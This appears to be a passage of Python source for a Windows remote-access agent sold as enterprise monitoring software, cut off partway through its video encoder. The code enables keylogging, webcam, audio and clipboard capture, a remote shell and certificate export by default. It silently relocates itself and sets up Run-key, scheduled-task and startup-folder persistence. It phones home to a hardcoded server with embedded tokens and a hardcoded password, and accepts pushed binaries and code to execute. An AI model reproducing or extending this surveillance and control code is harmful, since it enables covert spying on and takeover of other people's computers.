"""
╔══════════════════════════════════════════════════════════════════════════════╗
║          Screen Connect MASTER AGENT  v10.0  — ULTRA LIVE-SYNC ENTERPRISE    ║
║          Remote Management, Monitoring, Surveillance & Control Agent         ║
║                                                                              ║
║  WHAT'S NEW IN v9.0 (SERVER v12 SYNC + ENTERPRISE EXPANSION):               ║
║                                                                              ║
║  ── Server v12 Protocol Integration ───────────────────────────────────    ║
║  • caps event handler — receives AGENT_CAPS + server version on connect     ║
║    and gates features accordingly (auto_update, wol, clipboard_sync, etc.)  ║
║  • push_update handler — receives new binary URL + SHA-256 hash from        ║
║    server, downloads, verifies integrity, re-launches new exe atomically    ║
║  • wol handler — relays Wake-on-LAN magic UDP packets on behalf of server   ║
║    to local LAN devices (server sends MAC, agent broadcasts on LAN)         ║
║  • transfer_progress — chunked file upload/download with per-chunk % acks   ║
║  • run_macro — server dispatches macro keystroke sequences; agent executes  ║
║  • run_scheduled_job — server dispatches pre-scheduled shell commands       ║
║  • recording_start / recording_stop — agent-side MP4 session recording      ║
║    with chunked base64 upload back to server index                           ║
║  • clipboard_sync — bidirectional clipboard with content-type tagging       ║
║    (plain, html, image) synced on every server viewer clipboard_set event   ║
║  • viewer_presence — co-viewer count + name overlay relay to agent          ║
║                                                                              ║
║  ── New Agent Capabilities ────────────────────────────────────────────    ║
║  • ScreenRecorder — records screen to MP4 via OpenCV, chunks upload         ║
║  • NetworkScanner — ARP + ICMP LAN host discovery with port probe           ║
║  • FileWatcher — real-time watchdog on arbitrary path trees, notifies server ║
║  • SystemEventsReader — reads Windows Event Log (System/Application/Security)║
║  • TunnelProxy — local TCP port-forward over Socket.IO (SSH/RDP tunneling)  ║
║  • EnvManager — get/set/delete environment variables (system-wide)          ║
║  • TaskScheduler — Windows Task Scheduler CRUD via COM                      ║
║  • CertManager — enumerate & export Windows certificate store entries       ║
║  • GroupPolicyReader — read LGPO settings via secedit + registry            ║
║  • HotpatchEngine — receive + exec signed Python patch bundles in-memory    ║
║                                                                              ║
║  ── Performance & Reliability ──────────────────────────────────────────    ║
║  • Transfer chunking raised from 512 KB → 2 MB for faster large-file ops   ║
║  • Heartbeat enriched: GPU name + VRAM, active user session, uptime ticks   ║
║  • Agent self-reports caps on connect so server dashboard reflects features  ║
║  • Shell PTY streaming: line-buffered async output via shell_stream events   ║
║  • All v8.0 features fully preserved + backward-compatible with v11 server  ║
╚══════════════════════════════════════════════════════════════════════════════╝

BUILD COMMAND:
  Activate a clean virtual environment, then:

  pip install python-socketio[client] mss Pillow psutil pywin32 ^
              pynput pyperclip cryptography opencv-python numpy ^
              requests wmi pyautogui pyinstaller comtypes ^
              sounddevice scipy watchdog

  pyinstaller --onefile --noconsole --icon=icon.ico ^
    --distpath ./bin --name master_agent ^
    --hidden-import=engineio.async_drivers.threading ^
    --hidden-import=pkg_resources.extern ^
    --hidden-import=cv2 ^
    --hidden-import=numpy ^
    --hidden-import=pynput.keyboard ^
    --hidden-import=pynput.mouse ^
    --hidden-import=sounddevice ^
    --hidden-import=scipy ^
    --hidden-import=comtypes ^
    --hidden-import=wmi ^
    --hidden-import=watchdog ^
    --collect-all=pynput ^
    --collect-all=sounddevice ^
    agent_v9.py

RENDER / PRODUCTION:
  SERVER_URL is read from the MVIEW_SERVER_URL environment variable at runtime.
  Default: https://screen-connect-rtca.onrender.com
  Set env var before compiling OR pass via env at launch:
    set MVIEW_SERVER_URL=https://your-app.onrender.com
"""
import os
import sys
import time
import json
import base64
import hashlib
import socket
import platform
import threading
import subprocess
import tempfile
import logging
import logging.handlers
import winreg
import ctypes
import uuid
import asyncio
import struct
from concurrent.futures import ThreadPoolExecutor
import random
import wave
import io
import re
import glob
import fnmatch
import shutil
import shutil as _shutil
from io import BytesIO
from pathlib import Path
from datetime import datetime, timedelta
from queue import Queue, Empty, Full
from collections import deque
from typing import Optional, Dict, List, Any

# ─── High-resolution timer support (Windows) ──────────────────────────────
if os.name == "nt":
    try:
        ctypes.windll.winmm.timeBeginPeriod(1)
    except Exception:
        pass

def relocate_agent():
    target_dir  = r"C:\Users\Public\mview"
    target_path = os.path.join(target_dir, "master_agent.exe")
    if sys.executable.lower() != target_path.lower():
        if not os.path.exists(target_dir):
            os.makedirs(target_dir)
        try:
            shutil.copy2(sys.executable, target_path)
            subprocess.Popen([target_path], shell=False, close_fds=True)
            sys.exit(0)
        except Exception:
            pass

# ─── Single-instance enforcement ────────────────────────────────────────────
_MUTEX_NAME     = "Global\\MasterAgent_SingleInstance_Lock"
_PID_FILE       = r"C:\Users\Public\mview\master_agent.pid"
_AGENT_EXE_NAME = "master_agent.exe"
_WIN32_MUTEX    = None


def _is_already_running() -> bool:
    """Return True if a live instance of this agent is already running."""
    my_pid = os.getpid()
    # Check PID file first (fast path)
    try:
        if os.path.exists(_PID_FILE):
            with open(_PID_FILE) as fh:
                pid = int(fh.read().strip())
            if pid != my_pid:
                try:
                    import psutil as _ps
                    p = _ps.Process(pid)
                    if p.is_running() and _AGENT_EXE_NAME.lower() in (p.name() or "").lower():
                        return True  # another live agent — bail out
                except Exception:
                    pass
    except Exception:
        pass
    # Mutex check (catches edge cases where PID file is stale)
    try:
        import ctypes as _ct
        test = _ct.windll.kernel32.CreateMutexW(None, True, _MUTEX_NAME)
        last_err = _ct.windll.kernel32.GetLastError()
        if last_err == 183:   # ERROR_ALREADY_EXISTS
            _ct.windll.kernel32.CloseHandle(test)
            return True
        # We own the mutex — keep it
        return False
    except Exception:
        return False


def _kill_stale_instances():
    my_pid = os.getpid()
    killed = []
    try:
        import psutil as _ps
        for proc in _ps.process_iter(["pid", "name"]):
            try:
                if (proc.info["name"] or "").lower() == _AGENT_EXE_NAME.lower() \
                        and proc.pid != my_pid:
                    proc.terminate()
                    try: proc.wait(timeout=3)
                    except Exception: proc.kill()
                    killed.append(proc.pid)
            except Exception: pass
    except ImportError:
        try:
            subprocess.call(
                ["taskkill", "/F", "/IM", _AGENT_EXE_NAME, "/FI", f"PID ne {my_pid}"],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            killed.append("taskkill")
        except Exception: pass
    return killed


def _write_pid_file():
    try:
        os.makedirs(os.path.dirname(_PID_FILE), exist_ok=True)
        with open(_PID_FILE, "w") as fh: fh.write(str(os.getpid()))
    except Exception: pass


def _acquire_single_instance_lock():
    """Kill stale instances, write PID, acquire global mutex. Call at startup only."""
    global _WIN32_MUTEX
    killed = _kill_stale_instances()
    if killed: time.sleep(0.5)
    _write_pid_file()
    try:
        import ctypes as _ct
        _WIN32_MUTEX = _ct.windll.kernel32.CreateMutexW(None, True, _MUTEX_NAME)
        if _ct.windll.kernel32.GetLastError() == 183:
            # Mutex already exists — release and re-acquire (handles crash recovery)
            _ct.windll.kernel32.ReleaseMutex(_WIN32_MUTEX)
            _ct.windll.kernel32.CloseHandle(_WIN32_MUTEX)
            time.sleep(0.2)
            _WIN32_MUTEX = _ct.windll.kernel32.CreateMutexW(None, True, _MUTEX_NAME)
    except Exception: pass


# ── Third-Party ────────────────────────────────────────────────────────────────
import socketio
import mss
import psutil
import requests
from PIL import Image, ImageDraw, ImageFilter, ImageEnhance
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

try:
    import pyautogui
    pyautogui.FAILSAFE = False
    pyautogui.PAUSE    = 0.0
    PYAUTOGUI_OK = True
except ImportError:
    PYAUTOGUI_OK = False

try:
    import cv2
    import numpy as np
    CV2_OK = True
except ImportError:
    CV2_OK = False

try:
    import dxcam
    DXCAM_OK = True
except ImportError:
    DXCAM_OK = False

# WebRTC support (optional — pip install aiortc aioice)
try:
    from aiortc import RTCPeerConnection, RTCSessionDescription, RTCDataChannel, RTCIceCandidate
    WEBRTC_OK = True
except ImportError:
    WEBRTC_OK = False

try:
    import pynput.keyboard
    import pynput.mouse
    PYNPUT_OK = True
except ImportError:
    PYNPUT_OK = False

try:
    import pyperclip
    CLIPBOARD_OK = True
except ImportError:
    CLIPBOARD_OK = False

try:
    import wmi
    WMI_OK = True
except ImportError:
    WMI_OK = False

try:
    import win32api
    import win32con
    import win32gui
    import win32process
    import win32security
    WIN32_OK = True
except ImportError:
    WIN32_OK = False

try:
    import sounddevice as sd
    import scipy.io.wavfile as wavfile
    AUDIO_OK = True
except ImportError:
    AUDIO_OK = False

try:
    import comtypes
    COMTYPES_OK = True
except ImportError:
    COMTYPES_OK = False

# ════════════════════════════════════════════════════════════════════════════
#  TRAILER TOKEN READER
# ════════════════════════════════════════════════════════════════════════════
_TRAILER_SIZE = 64
_MAGIC_HEAD   = b"MVTK"
_MAGIC_TAIL   = b"MVED"

def _read_token_from_trailer() -> str:
    try:
        exe = Path(sys.executable if getattr(sys, "frozen", False) else __file__).resolve()
        data = exe.read_bytes()
        if len(data) < _TRAILER_SIZE:
            return ""
        trailer = data[-_TRAILER_SIZE:]
        if trailer[:4] != _MAGIC_HEAD or trailer[60:64] != _MAGIC_TAIL:
            return ""
        return trailer[4:60].rstrip(b"\x00").decode("utf-8").strip()
    except Exception:
        return ""


# ════════════════════════════════════════════════════════════════════════════
#  CONFIGURATION
# ════════════════════════════════════════════════════════════════════════════
CONFIG = {
    # ── Connection ──────────────────────────────────────────────────────────
    # For Local LAN testing: Use http://YOUR_PC_IP:10000
    # For Render live: Use https://your-app.onrender.com
    "SERVER_URL":           os.environ.get("MVIEW_SERVER_URL", "https://screen-connect-rtca.onrender.com"),
    "DEVICE_TOKEN":         "MV-5F3B23-8BD7A7-4B1392",

    # ── Identity ────────────────────────────────────────────────────────────
    "AGENT_VERSION":        "10.0.0",  # ULTRA LIVE-SYNC ENTERPRISE build
    "HEARTBEAT_INTERVAL":   5,   # v10: 5s heartbeat for faster dead-detection
    "RECONNECT_BASE":       1,   # v10: 1s base reconnect
    "RECONNECT_MAX":        15,  # v10: max 15s backoff (was 60s)

    # ── Streaming (Advanced Monitor — second-site engine) ───────────────────
    "STREAM_FPS":           60,         # target FPS — range 30-60 (ENTERPRISE LIVE-SYNC)
    "STREAM_MIN_FPS":       60,         # v14: lock at 60fps, no sparing the gpu
    "STREAM_QUALITY":       92,         # quality 92 — crisp lossless-looking output
    "STREAM_MONITOR":       1,
    "STREAM_MODE":          "screenshot",    # "video" or "screenshot"

    # ── Security ────────────────────────────────────────────────────────────
    "ENCRYPTION_PASSWORD":  "mview-enterprise-2024",
    "ENCRYPT_PAYLOADS":     False,

    # ── Persistence ─────────────────────────────────────────────────────────
    "INSTALL_PERSISTENCE":  False,
    "REG_KEY_NAME":         "ScreenConnectService",
    "TASK_NAME":            "ScreenConnectTask",
    "STARTUP_DELAY":        2,

    # ── Features ────────────────────────────────────────────────────────────
    "ENABLE_KEYLOGGER":     True,
    "ENABLE_CLIPBOARD":     True,
    "ENABLE_WEBCAM":        True,
    "ENABLE_PROCESS_MGR":   True,
    "ENABLE_FILE_BROWSER":  True,
    "ENABLE_SHELL":         True,
    "ENABLE_AUDIO":         True,
    "ENABLE_REGISTRY":      True,
    "ENABLE_SERVICES":      True,
    "ENABLE_WINMGR":        True,
    "ENABLE_FILEWATCHER":   True,
    "ENABLE_ALERTS":        True,
    "ENABLE_NETWORK_SCAN":  True,
    "ENABLE_SCREEN_RECORD": True,
    "ENABLE_TUNNEL_PROXY":  True,
    "KEYLOG_FLUSH_INTERVAL": 20,
    "CLIPBOARD_POLL_MS":    800,

    # ── File transfer chunking ────────────────────────────────────────────
    "TRANSFER_CHUNK_BYTES": 2 * 1024 * 1024,   # 2 MB chunks (v9 upgrade from 512 KB)

    # ── Auto-update ──────────────────────────────────────────────────────
    "AUTO_UPDATE_ENABLED":  True,     # honour push_update from server

    # ── Alert thresholds ────────────────────────────────────────────────────
    "ALERT_CPU_THRESHOLD":  90,     # % CPU
    "ALERT_RAM_THRESHOLD":  90,     # % RAM
    "ALERT_DISK_THRESHOLD": 95,     # % disk usage
    "ALERT_COOLDOWN_S":     300,    # seconds between repeated alerts

    # ── Server capability mirror (populated on 'caps' event) ─────────────
    "SERVER_CAPS":          {},
    "SERVER_VERSION":       "unknown",
}

# ── Auto-registration: each machine gets a unique ID from its hardware ──────
# No token needed by the end user. The SHARED_TOKEN authenticates this agent
# to YOUR server. The unique device_id is derived from the machine's hardware
# so every downloaded exe auto-registers as its own separate entry in your dashboard.
SHARED_TOKEN = "MVIEW-GLOBAL-AGENT-v8"  # ← Must match REMOTE_ADMIN_TOKEN or be accepted by server

def _derive_device_id() -> str:
    """Generate a unique, stable device ID from machine hardware. No user input needed."""
    import uuid as _uuid, socket as _sock, hashlib as _hash, platform as _plat
    try:
        mac  = str(_uuid.getnode())
        host = _sock.gethostname()
        cpu  = _plat.processor() or _plat.machine()
        raw  = f"{mac}-{host}-{cpu}-MVIEW"
        return "MV-" + _hash.sha256(raw.encode()).hexdigest()[:20].upper()
    except Exception:
        # Last resort: random but persisted to temp file so it stays stable
        import tempfile, os, random, string
        id_file = os.path.join(tempfile.gettempdir(), ".mview_device_id")
        if os.path.exists(id_file):
            try: return open(id_file).read().strip()
            except: pass
        new_id = "MV-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=20))
        try: open(id_file, "w").write(new_id)
        except: pass
        return new_id

# Try trailer token first (for custom/enterprise deployments), then auto-generate
_tok = _read_token_from_trailer()
if not _tok:
    _tok = os.environ.get("MVIEW_TOKEN", "").strip()
if not _tok:
    if len(sys.argv) > 1 and sys.argv[1].startswith("MV-"):
        _tok = sys.argv[1].strip()

# If still no token — auto-generate unique device ID from hardware (global deploy mode)
if not _tok:
    if CONFIG.get("DEVICE_TOKEN") and CONFIG["DEVICE_TOKEN"] != "UNSET":
        _tok = CONFIG["DEVICE_TOKEN"]
    else:
        _tok = _derive_device_id()

CONFIG["DEVICE_TOKEN"] = _tok


# ════════════════════════════════════════════════════════════════════════════
#  LOGGING
# ════════════════════════════════════════════════════════════════════════════
LOG_FILE = Path("agent.log")
_log_handler = logging.handlers.RotatingFileHandler(
    LOG_FILE, maxBytes=2 * 1024 * 1024, backupCount=3, encoding="utf-8"
)
_log_handler.setFormatter(logging.Formatter(
    "%(asctime)s [%(levelname)-8s] %(threadName)s — %(message)s"
))
_root_logger = logging.getLogger()
_root_logger.setLevel(logging.INFO)
_root_logger.addHandler(_log_handler)

# Use a custom StreamHandler that handles encoding better
class UTF8StreamHandler(logging.StreamHandler):
    def emit(self, record):
        try:
            msg = self.format(record)
            stream = self.stream
            # Force write as utf-8 or ignore errors
            stream.write(msg.encode('utf-8', errors='replace').decode('utf-8') + self.terminator)
            self.flush()
        except Exception:
            self.handleError(record)

_root_logger.addHandler(UTF8StreamHandler(sys.stdout))
log = logging.getLogger("agent")


# ════════════════════════════════════════════════════════════════════════════
#  ENCRYPTION MODULE
# ════════════════════════════════════════════════════════════════════════════
class Encryptor:
    def __init__(self, password: str):
        salt = b"mview_salt_2024_"
        kdf  = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=salt, iterations=100_000)
        self._fernet = Fernet(base64.urlsafe_b64encode(kdf.derive(password.encode())))

    def encrypt(self, data: str) -> str:
        return self._fernet.encrypt(data.encode()).decode()

    def encrypt_bytes(self, data: bytes) -> bytes:
        return self._fernet.encrypt(data)


_encryptor = Encryptor(CONFIG["ENCRYPTION_PASSWORD"])


def safe_emit(sio_client, event: str, payload: dict):
    if CONFIG["ENCRYPT_PAYLOADS"]:
        sio_client.emit(event, {"encrypted": True, "data": _encryptor.encrypt(json.dumps(payload))})
    else:
        sio_client.emit(event, payload)


# ════════════════════════════════════════════════════════════════════════════
#  DEVICE IDENTITY
# ════════════════════════════════════════════════════════════════════════════
def get_device_id() -> str:
    """Return the unique device ID used for server communication."""
    return CONFIG.get("DEVICE_TOKEN", "UNSET")


def get_device_fingerprint() -> dict:
    try:
        local_ip = socket.gethostbyname(socket.gethostname())
    except Exception:
        local_ip = "unknown"

    uname = platform.uname()
    vm    = psutil.virtual_memory()
    did   = CONFIG["DEVICE_TOKEN"]
    fp = {
        "device_id":       did,
        "token":           did,
        "hardware_id":     did,
        "hostname":        socket.gethostname(),
        "username":        os.getenv("USERNAME") or os.getenv("USER") or "unknown",
        "os":              f"{uname.system} {uname.release}",
        "os_version":      uname.version,
        "machine":         uname.machine,
        "processor":       uname.processor,
        "local_ip":        local_ip,
        "agent_version":   CONFIG["AGENT_VERSION"],
        "stream_mode":     CONFIG["STREAM_MODE"],
        "timestamp":       datetime.utcnow().isoformat(),
        "screen_count":    _get_screen_count(),
        "cpu_count":       psutil.cpu_count(logical=True),
        "ram_total_gb":    round(vm.total / (1024**3), 2),
        "features": {
            "keylogger":  PYNPUT_OK and CONFIG["ENABLE_KEYLOGGER"],
            "clipboard":  CLIPBOARD_OK,
            "webcam":     CV2_OK,
            "audio":      AUDIO_OK,
            "registry":   WIN32_OK,
            "services":   WMI_OK,
        }
    }
    if WMI_OK:
        try:
            gpus = [g.Name for g in wmi.WMI().Win32_VideoController()]
            fp["gpu"] = ", ".join(gpus) or "unknown"
        except Exception:
            fp["gpu"] = "unknown"
    return fp


def _get_screen_count() -> int:
    try:
        with mss.mss() as sct:
            return len(sct.monitors) - 1
    except Exception:
        return 1


def _get_monitor_resolution(monitor_idx: int = 1):
    """Return (width, height) for the given monitor index."""
    try:
        with mss.mss() as sct:
            idx = min(monitor_idx, len(sct.monitors) - 1)
            mon = sct.monitors[idx]
            return mon["width"], mon["height"]
    except Exception:
        return 1920, 1080

def _get_monitor_geometry(monitor_idx: int = 1):
    """Return the selected monitor's virtual desktop bounds."""
    try:
        with mss.mss() as sct:
            idx = max(1, min(int(monitor_idx or 1), len(sct.monitors) - 1))
            mon = sct.monitors[idx]
            return {
                "left": int(mon.get("left", 0)),
                "top": int(mon.get("top", 0)),
                "width": int(mon.get("width", 1920)),
                "height": int(mon.get("height", 1080)),
            }
    except Exception:
        return {"left": 0, "top": 0, "width": 1920, "height": 1080}

def _to_monitor_absolute(x, y, monitor_idx: int | None = None, w: int | None = None, h: int | None = None):
    """Map viewer-relative monitor coordinates to OS absolute desktop coordinates."""
    try:
        # Handle cases where x or y might be NaN or invalid from a black-screen dashboard
        fx, fy = float(x), float(y)
        fw, fh = float(w or 0), float(h or 0)
        # Use math.isinf/isnan if numpy isn't available
        import math
        if math.isinf(fx) or math.isnan(fx) or math.isinf(fy) or math.isnan(fy):
            return 0, 0
    except (ValueError, TypeError):
        return 0, 0

    mon = _get_monitor_geometry(monitor_idx or CONFIG["STREAM_MONITOR"])
    
    # If the dashboard sent its canvas dimensions (w, h), calculate ratios
    if fw > 0 and fh > 0:
        rx = int((fx / fw) * (mon["width"] - 1))
        ry = int((fy / fh) * (mon["height"] - 1))
    # Else if the input is in 0..1 range (normalized), scale it
    elif 0.0 <= fx <= 1.0 and 0.0 <= fy <= 1.0 and mon["width"] > 1:
        rx = int(fx * (mon["width"] - 1))
        ry = int(fy * (mon["height"] - 1))
    else:
        # Fallback for pixel coordinates (if dashboard sends them)
        rx = max(0, min(int(fx), max(0, mon["width"] - 1)))
        ry = max(0, min(int(fy), max(0, mon["height"] - 1)))
        
    return mon["left"] + rx, mon["top"] + ry

def _cursor_relative_to_monitor(monitor_idx: int | None = None):
    """Return cursor position relative to the selected monitor, or None if outside it."""
    if not PYAUTOGUI_OK:
        return None
    mon = _get_monitor_geometry(monitor_idx or CONFIG["STREAM_MONITOR"])
    try:
        x, y = pyautogui.position()
    except Exception:
        return None
    rx, ry = int(x) - mon["left"], int(y) - mon["top"]
    if rx < -50 or ry < -50 or rx >= mon["width"]+50 or ry >= mon["height"]+50:
        return None
    rx = max(0, min(rx, mon["width"] - 1))
    ry = max(0, min(ry, mon["height"] - 1))
    return rx, ry


# ════════════════════════════════════════════════════════════════════════════
#  PERSISTENCE MODULE
# ════════════════════════════════════════════════════════════════════════════
def install_persistence():
    if not CONFIG["INSTALL_PERSISTENCE"]:
        return
    exe = sys.executable if getattr(sys, "frozen", False) else os.path.abspath(__file__)
    exe_quoted = f'"{exe}"'

    # Registry
    try:
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE) as k:
            winreg.SetValueEx(k, CONFIG["REG_KEY_NAME"], 0, winreg.REG_SZ, exe_quoted)
        log.info(f"Registry persistence installed: {exe}")
    except Exception as e:
        log.warning(f"Registry persistence failed: {e}")

    # Also try HKLM (requires admin)
    try:
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path, 0,
                            winreg.KEY_SET_VALUE | winreg.KEY_WOW64_64KEY) as k:
            winreg.SetValueEx(k, CONFIG["REG_KEY_NAME"], 0, winreg.REG_SZ, exe_quoted)
        log.info("HKLM registry persistence installed.")
    except Exception:
        pass

    # Task Scheduler
    try:
        task_xml = f"""<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo><Description>Screen Connect Service</Description></RegistrationInfo>
  <Triggers>
    <LogonTrigger><Enabled>true</Enabled></LogonTrigger>
    <BootTrigger><Enabled>true</Enabled><Delay>PT10S</Delay></BootTrigger>
    <TimeTrigger>
      <Repetition><Interval>PT5M</Interval><StopAtDurationEnd>false</StopAtDurationEnd></Repetition>
      <StartBoundary>2020-01-01T00:00:00</StartBoundary>
      <Enabled>true</Enabled>
    </TimeTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author"><LogonType>InteractiveToken</LogonType><RunLevel>HighestAvailable</RunLevel></Principal>
  </Principals>
  <Actions Context="Author">
    <Exec><Command>{exe}</Command></Exec>
  </Actions>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <RestartOnFailure><Interval>PT1M</Interval><Count>999</Count></RestartOnFailure>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
  </Settings>
</Task>"""
        xml_path = Path(tempfile.gettempdir()) / "sc_task.xml"
        xml_path.write_text(task_xml, encoding="utf-16")
        subprocess.run(
            ["schtasks", "/create", "/tn", CONFIG["TASK_NAME"], "/xml", str(xml_path), "/f"],
            capture_output=True, timeout=15
        )
        xml_path.unlink(missing_ok=True)
        log.info("Task Scheduler persistence installed.")
    except Exception as e:
        log.warning(f"Task Scheduler persistence failed: {e}")

    # Startup folder shortcut
    try:
        startup = Path(os.getenv("APPDATA", "")) / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup"
        link    = startup / "ScreenConnect.lnk"
        ps_cmd  = f"""
$sh = New-Object -ComObject WScript.Shell
$lnk = $sh.CreateShortcut('{link}')
$lnk.TargetPath = '{exe}'
$lnk.Save()
"""
        subprocess.run(["powershell", "-NoProfile", "-NonInteractive", "-Command", ps_cmd],
                       capture_output=True, timeout=10)
        log.info("Startup folder shortcut installed.")
    except Exception:
        pass


def remove_persistence():
    for key_root in [winreg.HKEY_CURRENT_USER, winreg.HKEY_LOCAL_MACHINE]:
        try:
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(key_root, key_path, 0, winreg.KEY_SET_VALUE) as k:
                winreg.DeleteValue(k, CONFIG["REG_KEY_NAME"])
        except Exception:
            pass
    try:
        subprocess.run(["schtasks", "/delete", "/tn", CONFIG["TASK_NAME"], "/f"],
                       capture_output=True, timeout=10)
    except Exception:
        pass
    try:
        startup = Path(os.getenv("APPDATA", "")) / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup"
        (startup / "ScreenConnect.lnk").unlink(missing_ok=True)
    except Exception:
        pass
    log.info("Persistence removed.")


# ════════════════════════════════════════════════════════════════════════════
#  ADVANCED MONITOR ENGINE  (second-site v2.1 — DXGI/mss + H264/JPEG + 60Hz cursor)
#  Replaces old ACK-gated ScreenStreamer, CursorTracker, NetworkMonitor entirely.
# ════════════════════════════════════════════════════════════════════════════

# ── Wire protocol (matches second-site server exactly) ────────────────────
FRAME_HDR  = struct.Struct(">IIQII")   # w, h, ts_us, flags, payload_len
CURSOR_HDR = struct.Struct(">iiI")     # x, y, ts_ms
FLAG_KEYFRAME = 0x01
FLAG_JPEG     = 0x02
FLAG_H264     = 0x04

# ── Adaptive FPS — gradual ramp, no sawtooth ─────────────────────────────
class AdaptiveFPS:
    """
    ENTERPRISE LIVE-SYNC v12.2 — always-max with ultra-slow decay.

    Strategy: lock at max_fps permanently. Only decay after 900+ consecutive
    idle frames (~30s at 30fps) to prevent any sawtooth during normal use.
    Ramp-up is instant (+max_fps in one step) so the stream never lags on
    motion after a brief idle.
    """
    def __init__(self, max_fps, min_fps):
        self.max_fps = max_fps; self.min_fps = min_fps
        self._cur = float(max_fps); self._idle = 0

    @property
    def interval(self): return 1.0 / max(self._cur, self.min_fps)

    def report(self, changed):
        if changed:
            self._idle = 0
            # Instant snap back to max — zero warm-up latency
            self._cur = float(self.max_fps)
        else:
            self._idle += 1
            # Only decay after 30s of total idle (900 frames @ 30fps)
            if self._idle > 900:
                self._cur = max(self.min_fps, self._cur - 1)

    @property
    def fps(self): return self._cur


# ── Screen capture backends ───────────────────────────────────────────────
class DXGICapture:
    def __init__(self, fps):
        import dxcam as _dxcam
        output_idx = max(0, int(CONFIG.get("STREAM_MONITOR", 1)) - 1)
        # v10: video_mode=True is actually faster for high FPS as it handles 
        # the capture loop in a dedicated C++ thread within dxcam.
        self._cam = _dxcam.create(output_idx=output_idx, output_color="BGR")
        self._cam.start(target_fps=fps, video_mode=True)
        log.info(f"Advanced Monitor Capture: DXGI GPU monitor={output_idx+1} @ {fps} fps")

    def grab(self) -> Optional[np.ndarray]:
        return self._cam.get_latest_frame()

    def close(self):
        try: self._cam.stop()
        except Exception: pass


class MSSCapture:
    def __init__(self):
        import mss as _mss
        self._mss = _mss.mss()
        mon_idx = int(CONFIG.get("STREAM_MONITOR", 1))
        # Ensure index is within bounds
        idx = max(1, min(mon_idx, len(self._mss.monitors) - 1))
        self._mon = self._mss.monitors[idx]
        log.info(f"Advanced Monitor Capture: mss CPU monitor={idx}")

    def grab(self) -> Optional[np.ndarray]:
        try:
            raw = self._mss.grab(self._mon)
            if CV2_OK:
                # v10 fast path: zero-copy BGRA → BGR via numpy view
                # np.frombuffer avoids a data copy; COLOR_BGRA2BGR is in-place on contiguous array
                bgra = np.frombuffer(raw.bgra, dtype=np.uint8).reshape(raw.height, raw.width, 4)
                return cv2.cvtColor(bgra, cv2.COLOR_BGRA2BGR)
            else:
                # PIL fallback (no cv2) — frombytes is faster than fromarray
                from PIL import Image as _PILImage
                import numpy as _np
                img = _PILImage.frombytes("RGBA", (raw.width, raw.height), raw.bgra, "raw", "BGRA")
                rgb = _np.array(img.convert("RGB"))
                return rgb[:, :, ::-1].copy()
        except Exception as e:
            # log.error(f"MSSCapture.grab error: {e}")
            # v10: Headless/Locked session fallback — return a dummy black frame
            # to keep the stream alive and allow metric collection
            frame = np.zeros((1080, 1920, 3), dtype=np.uint8)
            if CV2_OK:
                cv2.putText(frame, f"DEBUG MODE: {datetime.utcnow().isoformat()}", 
                            (50, 50), cv2.FONT_HERSHEY_SIMPLEX, 1, (0, 255, 0), 2)
                cv2.putText(frame, "Headless Capture Active", (50, 100), 
                            cv2.FONT_HERSHEY_SIMPLEX, 1, (0, 255, 0), 2)
            return frame

    def close(self):
        try: self._mss.close()
        except Exception: pass


def _make_capture():
    if DXCAM_OK:
        try: return DXGICapture(CONFIG["STREAM_FPS"])
        except Exception as e: log.warning(f"DXGI failed ({e}), falling back to mss")
    return MSSCapture()


# ── Frame differ (skip unchanged frames) ─────────────────────────────────
class FrameDiffer:
    def __init__(self):
        self._prev = None

    def changed(self, frame) -> bool:
        if frame is None:
            return False
        if not CV2_OK:
            return True
        if self._prev is None:
            self._prev = frame.copy()
            return True
        try:
            # v10: 4-zone diff — compare 4 quadrants independently.
            # This catches changes in any corner (e.g. clock ticking, cursor in corner)
            # without being fooled by a single bright pixel difference.
            h, w = frame.shape[:2]
            qh, qw = max(1, h // 4), max(1, w // 4)
            for qy in range(4):
                for qx in range(4):
                    y0, y1 = qy*qh, min(h, (qy+1)*qh)
                    x0, x1 = qx*qw, min(w, (qx+1)*qw)
                    zone_diff = cv2.absdiff(
                        frame[y0:y1, x0:x1:4],    # subsample every 4th pixel
                        self._prev[y0:y1, x0:x1:4]
                    ).max()
                    if zone_diff > 3:  # threshold: any zone with >=3 pixel delta = changed
                        self._prev = frame.copy()
                        return True
            return False
        except Exception as e:
            log.debug(f"FrameDiffer error: {e}")
            return True


# ── Encoders ─────────────────────────────────────────────────────────────
class H264Encoder:
    _CODECS = ["h264_nvenc", "h264_amf", "h264_videotoolbox", "libx264"]

    def __init__(self, w, h, fps, crf=23):
        import av
        self._av = av; self.w = w; self.h = h; self.fps = fps; self.crf = crf
        self._codec = self._pick(); self._pts = 0
        log.info(f"Advanced Monitor Encoder: H.264/{self._codec}")

    def _pick(self):
        import av
        for c in self._CODECS:
            try:
                cc = av.CodecContext.create(c, "w")
                cc.width = self.w; cc.height = self.h
                cc.framerate = self.fps
                cc.options = {"crf": str(self.crf), "preset": "ultrafast", "tune": "zerolatency"}
                cc.open(); self._cc = cc; return c
            except Exception: pass
        raise RuntimeError("No H.264 encoder available")

    def encode_frame(self, bgr: np.ndarray, force_key=False):
        import av
        rgb = cv2.cvtColor(bgr, cv2.COLOR_BGR2RGB)
        vf  = av.VideoFrame.from_ndarray(rgb, format="rgb24")
        vf.pts = self._pts; self._pts += 1
